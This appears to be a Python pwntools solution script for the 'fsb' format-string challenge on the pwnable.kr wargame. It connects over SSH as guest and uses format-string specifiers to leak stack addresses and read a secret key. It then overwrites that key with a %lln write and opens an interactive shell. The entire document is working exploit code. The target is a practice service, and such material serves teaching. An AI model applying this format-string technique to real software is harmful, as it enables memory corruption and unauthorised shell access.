#!/usr/bin/env python3
from pwn import *

def SendLine(process, s):
    process.sendline(s)
    print(s)

conn = ssh('fsb', 'pwnable.kr', 2222, 'guest')
p = conn.process(['/home/fsb/fsb'])
print(p.recv().decode(), end = '')

SendLine(p, '0x%14$lx\n0x%18$lx')
recv = p.recv()
print(recv.decode())
addr_fsb_argv = int(recv.split(b'\n')[0].decode(), 16)
prev_ebp = int(recv.split(b'\n')[1].decode(), 16)
print('----------------------------')
print('addr_fsb_argv =', hex(addr_fsb_argv))
print('prev_ebp =', hex(prev_ebp))
print('----------------------------')

addr_Ptr_key = prev_ebp - 0x44
Offset = addr_Ptr_key - addr_fsb_argv
assert Offset % 4 == 0

SendLine(p, '%%%d$s' % (20 + Offset // 4))
recv = p.recv()
print(recv)
assert len(recv.split(b'\n')[0]) == 8
key = unpack(recv[0:8], 64)
print('----------------------------')
print('key =', key)
print('----------------------------')

SendLine(p, '%%16c%%%d$lln' % (20 + Offset // 4))
print(p.recv(), end = '')
SendLine(p, 'fuck')
print(p.recv(), end = '')

sleep(5)
p.interactive()
